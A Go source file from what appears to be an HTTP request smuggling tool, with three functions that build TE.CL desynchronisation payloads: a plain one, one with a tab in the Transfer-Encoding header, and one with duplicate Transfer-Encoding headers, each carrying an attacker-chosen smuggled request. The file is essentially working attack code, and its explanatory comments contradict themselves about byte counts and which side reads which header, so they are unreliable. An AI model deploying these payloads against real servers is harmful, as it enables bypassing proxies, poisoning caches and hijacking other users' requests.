package payload

import (
	"fmt"
	"strings"
)

// GenerateTECL creates a TE.CL (Transfer-Encoding / Content-Length) smuggling payload.
//
// TECHNIQUE EXPLANATION:
// In TE.CL desynchronization:
// 1. Proxy sees Transfer-Encoding: chunked and processes chunks
// 2. Backend sees Content-Length and uses that to determine message boundaries
// 3. After proxy finishes chunked parsing, extra data = smuggled request
//
// PAYLOAD STRUCTURE:
// - First request uses Transfer-Encoding: chunked (for proxy)
// - Contains a Content-Length header (for backend)
// - Chunk format: "size\r\ndata\r\n"
// - Backend counts Content-Length bytes from after headers, treating chunks as literal data
// - When proxy finishes chunk parsing, remaining data is next request (smuggled)
//
// baseRequest: the request line + headers (without final CRLF)
// smoggledBody: the HTTP request to smuggle
func GenerateTECL(baseRequest string, smoggledBody string) string {
	var buf strings.Builder

	buf.WriteString(baseRequest)

	// Content-Length: backend will use this to determine where this request ends
	// It counts from the first byte after the final \r\n of headers
	// We set it to just cover the chunked data we want it to see
	contentLengthValue := 5 // "5\r\n0" is 5 bytes
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	// Transfer-Encoding tells proxy to expect chunks
	buf.WriteString("Transfer-Encoding: chunked\r\n")

	// End headers
	buf.WriteString("\r\n")

	// Chunked encoding that proxy will process
	// Chunk size: 0 (end of chunks)
	buf.WriteString("0\r\n")
	buf.WriteString("\r\n")

	// From backend's perspective (using Content-Length):
	// It will read only 5 bytes: "0\r\n\r\n" but that's exactly the chunk close
	// After headers are parsed, remaining data gets treated as body
	// Extra padding to reach Content-Length boundary, then smuggled request

	// Smuggled request follows - proxy sees it as new request, backend may read part of it
	// as part of the first request's body (depending on Content-Length)
	buf.WriteString(smoggledBody)

	return buf.String()
}

// GenerateTECLAmbiguous creates a variant of TE.CL with tab/space in Transfer-Encoding.
// Some parsers normalize whitespace, others don't, creating desynchronization.
//
// Example: "Transfer-Encoding: \tchunked" (tab before chunked)
func GenerateTECLAmbiguous(baseRequest string, smoggledBody string) string {
	var buf strings.Builder

	buf.WriteString(baseRequest)

	contentLengthValue := 5
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	// Ambiguous spacing in Transfer-Encoding header
	// Some parsers strip it, others treat it as malformed
	buf.WriteString("Transfer-Encoding:\tchunked\r\n")

	buf.WriteString("\r\n")

	buf.WriteString("0\r\n")
	buf.WriteString("\r\n")

	// Smuggled request
	buf.WriteString(smoggledBody)

	return buf.String()
}

// GenerateTECLDualChunked creates TE.CL with multiple te headers to test parser ambiguity.
// Some servers concatenate, others take the last value.
func GenerateTECLDualChunked(baseRequest string, smoggledBody string) string {
	var buf strings.Builder

	buf.WriteString(baseRequest)

	contentLengthValue := 5
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	// Multiple TE headers - testing concatenation vs. override behavior
	buf.WriteString("Transfer-Encoding: identity\r\n")
	buf.WriteString("Transfer-Encoding: chunked\r\n")

	buf.WriteString("\r\n")

	buf.WriteString("0\r\n")
	buf.WriteString("\r\n")

	buf.WriteString(smoggledBody)

	return buf.String()
}
